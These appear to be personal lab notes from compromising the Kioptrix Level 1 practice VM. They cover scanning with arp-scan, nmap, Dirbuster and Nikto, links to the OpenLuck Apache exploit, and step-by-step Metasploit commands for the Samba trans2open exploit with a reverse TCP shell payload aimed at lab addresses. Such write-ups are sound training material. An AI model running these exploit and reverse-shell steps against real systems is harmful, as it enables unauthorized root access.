IP - 192.168.133.128

---

NOTES:

![](attachment/1ce01805b1f8f9bdb57874acbb181943.png)

80/443 - Potentially vulnerable to OpenLuck([https://www.exploit-db.com/exploits/764](https://www.exploit-db.com/exploits/764)),[https://github.com/heltonWernik/OpenLuck](https://github.com/heltonWernik/OpenLuck)

  

Potentially vulnerable totrans2open([https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/](https://www.rapid7.com/db/modules/exploit/linux/samba/trans2open/)),[https://www.exploit-db.com/exploits/16861](https://www.exploit-db.com/exploits/16861)

---

---

---

1 - arp scan detected ip for the kioptrx machine:

![](attachment/2ef74188dd39d0e59f0734d3506f6d9f.png)

2 - nmap scan for the Kioptrx machine Level 1:

![](attachment/b5c3694321e31535e0e0287ab010c816.png)

---

**Dirbuster is a tool that can discover directories available on a web server.**

![](attachment/c1ddb9d6197c02dcb9853ea9883256db.png)

**Nikto targets HTTP:**

![](attachment/89be4567493d3ba3f3d73d89f5599b54.png)

---

First Metasploit:

![](attachment/de701ad8e8cfcc17601048f99f12915d.png)

ssh:

![](attachment/ff5dd8b2233afafa16085eb139187dbd.png)

---

![](attachment/fb430ba5ed1972179adcb5a8a7c14ffa.png)

![](attachment/31a2b4a8c04f751fc2bac46e253e8f45.png)

---

Gaining root with Metasploit:

1 - _search trans2open_

![](attachment/4851bc938f90859ede001f87933bb5d1.png)

2 - _use exploit/linux/samba/trans2open_

![](attachment/8b268854c88b341f9a7edf720317f817.png)

3 - _set RHOST192.168.1.14_

4 - _set payload linux/x86/shell_reverse_tcp_

5 - _set lhost 192.168.1.15_

6 - **_exploit_**

![](attachment/b5bf0c7e6b54901e5f0a7de75359dc0e.png)

---

Gaining root manually:

1 - Downloaded OpenFuck:

![](attachment/cc0951d4546d26728272a2dbb2a3d784.png)

2 - followed the installation demo

3 - **gained access**

![](attachment/c67b8e052f35f99ccc203f1768dff87f.png)